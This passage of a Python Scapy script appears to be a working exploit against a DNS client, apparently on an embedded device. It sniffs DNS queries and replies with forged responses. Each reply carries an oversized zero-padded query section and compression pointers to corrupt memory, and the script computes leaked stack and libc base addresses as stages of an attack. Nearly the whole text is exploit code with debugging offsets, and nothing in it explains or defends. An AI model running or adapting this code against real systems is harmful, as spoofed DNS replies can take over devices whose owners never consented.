        next_dst = (u32(stack_addr) - 0x1b) + 0x1f
        print("NEXT DEST")
        print(hex(next_dst))
        NEXT_DEST = next_dst
        #print("gggggggggg")
        #print ()
        id_b = pkt[DNS].id.to_bytes(2, 'big')
        ## query len got from program is 21
        dns_layer = (
                ## header 0xc = 12 
                id_b + b'\x81\x80'      # Header: ID + Flags
                b'\x00\x01\x00\x01'      # QDCOUNT=1, ANCOUNT=1
                b'\x00\x00\x00\x00'      # NSCOUNT=0, ARCOUNT=0
                # query len = 21 from log
                b'\x04Dns1'              # First label length + "Dns1"
                b'\x06comexe'            # Second label length + "comexe"
                b'\x03net\x00'           # Third label length + "net" + terminator
                b'\x00\x01\x00\x01'      # QTYPE=1(A), QCLASS=1(IN)
                ## then response
                b'\xc0\x0c'              # Compression pointer to name
                b'\x00\x01\x00\x01'      # TYPE=1(A), CLASS=1(IN)
                b'\x00\x00\x0e\x10'      # TTL
                b'\x00\x04'              # RDLENGTH=4
                b'\xc0\xa8\x64\x09'      # RDATA (IP address)   ##  c0.a8.64.01 (0xc0a86401) == 192.168.100.1
            )
        # Now create the good packet query len 0x20a == 522, will be always this value cause to how we feed len from earlier
        first = (
            ## header 0xc = 12 
                id_b + b'\x81\x80'      # Header: ID + Flags
                b'\x00\x01\x00\x01'      # QDCOUNT=1, ANCOUNT=1
                b'\x00\x00\x00\x00'      # NSCOUNT=0, ARCOUNT=0
        )
        
        qry = b'\x00'* 0x20a

        second = (
                ## then response
                b'\xc0\x0c'              # Compression pointer to name
                b'\x00\x01\x00\x01'      # TYPE=1(A), CLASS=1(IN)
                b'\x00\x00\x0e\x10'      # TTL
                b'\x00\x04'              # RDLENGTH=4
                b'\xc0\xa8\x64\x01'      # RDATA (IP address)   ##  c0.a8.64.01 (0xc0a86401) == 192.168.100.1
        )

        dns_resp = first + qry + second    
        LEAK = 1
        DNS_PACKET_ID = pkt[DNS].id ## Save id for future use

            # Create and send response
        dns_response_pkt = IP(dst=pkt[IP].src, src=pkt.getlayer('IP').dst)/\
                        UDP(dport=pkt[UDP].sport, sport=53)/\
                        dns_resp
        send(dns_response_pkt)


    elif pkt[IP].dst == "9.9.9.9":
        header_size = 0xc
        libc_addr = raw(pkt[DNS])[header_size: header_size+4]
        #log.info ("Stack")
        print("LIBC LEAK")
        print(hex(u32(libc_addr)))
        libc_base = u32(libc_addr) - 0x516e4
        print("LIBC BASE")
        print(hex(libc_base))
        LIBC_BASE = libc_base
        ## Use the stored packet id + 1
        id = DNS_PACKET_ID + 1 
        id_b = id.to_bytes(2, 'big')
        
        # Now create the good packet query len 0x20a == 522, will be always this value cause to how we feed len from earlier
        first = (
            ## header 0xc = 12 
                id_b + b'\x81\x80'      # Header: ID + Flags
                b'\x00\x01\x00\x01'      # QDCOUNT=1, ANCOUNT=1
                b'\x00\x00\x00\x00'      # NSCOUNT=0, ARCOUNT=0
        )
        
        qry = b'\x00'* 534  ### Here it is 534 don't really know why

        second = (
                ## then response
                b'\xc0\x0c'              # Compression pointer to name
                b'\x00\x01\x00\x01'      # TYPE=1(A), CLASS=1(IN)
                b'\x00\x00\x0e\x10'      # TTL
                b'\x00\x04'              # RDLENGTH=4
                b'\xc0\xa8\x64\x01'      # RDATA (IP address)   ##  c0.a8.64.01 (0xc0a86401) == 192.168.100.1
        )
        dns_resp = first + qry + second    
        LEAK_LIBC = 1

            # Create and send response
        dns_response_pkt = IP(dst=pkt[IP].src, src=pkt.getlayer('IP').dst)/\
                        UDP(dport=pkt[UDP].sport, sport=53)/\
                        dns_resp
        send(dns_response_pkt)




















        #leak_stack_gdb = 0x7fffeba4
        ## 0x7fffea89  or 0x7fffea8a or 0x7fffea88
        ## No 0x7fffea89 start 
        ### 0x43 0x7fffeb0a
        ### 0x7fffeb8a-1
        #print(raw(pkt[DNS]))
        '''
                >>> hex(0x7fffeb89-0x7fffea88)
                '0x101'
                >>> hex (0x7fffeba4-0x7fffeb89)
                '0x1b'
                >>> 
                >>> hex(3+0x10+0x4+0x4+0x4)
                '0x1f'
                >>> 
        '''


    '''else: # DDNS
        print(f"\nReceived packet from {pkt[IP].src}:")
        pkt.show()'''


## Run as root /// Implement verification later
sniff(filter=filter, prn=dns_response, iface=iface)
